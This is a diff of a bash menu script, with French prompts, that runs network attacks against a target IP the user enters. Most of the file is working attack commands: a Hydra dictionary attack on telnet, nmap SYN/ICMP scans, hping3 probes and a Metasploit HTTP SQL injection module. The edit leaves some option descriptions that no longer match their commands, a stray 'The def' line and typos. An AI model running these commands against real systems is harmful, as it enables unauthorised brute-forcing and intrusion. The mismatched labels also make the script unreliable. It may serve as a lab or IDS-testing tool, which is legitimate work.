@@ -2,10 +2,10 @@
 
 echo "Liste d'options d'attaques :"
 echo "1. Dictionary attack on telnet service using hydra"
-echo "2. nmap scan with TCP SYN and UDP probes"
-echo "3. nmap scan with TCP RST probes"
+echo "2. nmap scan with TCP SYN and ICMP"
+echo "3. Recognation attqcks using hping3"
 echo "4. HTTP SQL injection using Metasploit"
-echo "5. nmap scan on a specific port using hping3"
+echo "5. hping3 scan on a specific port"
 echo "6. Exit"
 
 read -p "Choisissez une option (1-6) : " choice
@@ -13,6 +13,7 @@ read -p "Choisissez une option (1-6) : " choice
 case $choice in
     1)
         echo "Option 1 : Dictionary attack on telnet service using hydra"
+        echo "The def"
         echo "----------------------------------------------------------"
         echo "Cette attaque utilise Hydra pour tenter une attaque par dictionnaire sur un service telnet."
         echo ""
@@ -22,20 +23,20 @@ case $choice in
         hydra -l $username -P $password_file $target_ip telnet
         ;;
     2)
-        echo "Option 2 : nmap scan with TCP SYN and UDP probes"
+        echo "Option 2 : nmap scan with TCP SYN and ICMP"
         echo "------------------------------------------------"
         echo "Cette attaque utilise nmap pour effectuer un scan de port avec des sondes TCP SYN et UDP."
         echo ""
         read -p "Entrez la plage d'adresses IP cible (ex. 192.168.1.1-50) : " target_ip
-        nmap -sS -sU -T4 -A -v $target_ip
+        sudo nmap -sS -R -PE -T4 -A -v $target_ip
         ;;
     3)
-        echo "Option 3 : nmap scan with TCP RST probes"
+        echo "Option 3 : Recognation attqcks using hping3"
         echo "----------------------------------------"
         echo "Cette attaque utilise nmap pour effectuer un scan de port avec des sondes TCP RST."
         echo ""
         read -p "Entrez l'adresse IP cible : " target_ip
-        nmap -Pn -n -sR -p 80 --send-eth --data-length 1000 -M 1000 $target_ip
+        sudo hping3 -1 -c 3 $target_ip
         ;;
     4)
         echo "Option 4 : HTTP SQL injection using Metasploit"
@@ -54,7 +55,7 @@ case $choice in
                   run;"
         ;;
     5)
-        echo "Option 5 : nmap scan on a specific port using hping3"
+        echo "Option 5 : hping3 scan on a specific port"
         echo "----------------------------------------------------"
         echo "Cette attaque utilise hping3 pour effectuer un scan de port sur un port spécifique."
         echo ""
